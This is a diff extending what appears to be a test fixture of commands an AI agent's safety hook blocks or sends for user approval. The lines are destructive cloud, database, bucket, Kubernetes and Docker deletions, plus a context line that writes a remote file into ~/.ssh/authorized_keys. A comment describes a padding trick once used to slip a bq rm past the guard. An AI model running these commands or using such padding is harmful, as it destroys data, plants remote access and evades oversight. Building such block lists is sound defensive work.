@@ -104,3 +104,56 @@ curl -s "https://studio.taufinity.io/api/data" --output ~/.ssh/authorized_keys
 # --- terraform destroy (irreversible, always require user approval) ---
 terraform destroy
 terraform destroy plan
+
+# --- gcloud stateful-service deletion (database/backup wipe) ---
+gcloud sql instances delete customer-prod-db
+gcloud sql databases delete mydb --instance=prod-instance
+gcloud sql backups delete 1234567890 --instance=prod-instance
+gcloud spanner instances delete prod-instance
+gcloud spanner databases delete mydb --instance=prod-instance
+gcloud spanner backups delete mybackup --instance=prod-instance --database=mydb
+gcloud firestore databases delete --database=prod
+gcloud redis instances delete prod-cache --region=europe-west4
+gcloud bigtable instances delete prod-instance
+gcloud bigtable clusters delete prod-cluster --instance=prod-instance
+gcloud alloydb instances delete prod-instance --cluster=prod-cluster --region=europe-west4
+gcloud alloydb clusters delete prod-cluster --region=europe-west4
+gcloud alloydb backups delete prod-backup --region=europe-west4
+gcloud memcache instances delete prod-cache --region=europe-west4
+
+# --- gsutil bucket removal / recursive wipe ---
+gsutil rb gs://customer-backups
+gsutil rb -f gs://customer-backups
+gsutil rm -r gs://customer-backups/2026/
+gsutil rm -R gs://customer-backups/2026/
+gsutil -m rm -r gs://customer-backups/
+
+# --- bq table/dataset deletion ---
+bq rm mydataset.mytable
+bq rm -f -r mydataset.mytable
+bq rm -f mydataset
+# SafeVerb-padding bypass attempt (was bash_continue.txt pre-hardening):
+# tail padding no longer helps since bq-rm matches "rm" anywhere.
+bq rm -f dataset show
+
+# --- kubectl/oc namespace and volume-claim deletion ---
+kubectl delete namespace production
+kubectl delete ns production
+kubectl delete pvc data-postgres-0
+kubectl delete persistentvolumeclaim data-postgres-0
+kubectl delete pv pv-prod-data
+oc delete namespace production
+oc delete pvc data-postgres-0
+
+# --- docker/podman volume deletion ---
+docker volume rm pg-data
+docker volume prune
+docker volume prune -f
+podman volume rm pg-data
+podman volume prune -f
+
+# --- docker compose down with volume removal ---
+docker compose down -v
+docker compose down --volumes
+docker-compose down -v
+docker-compose down --volumes
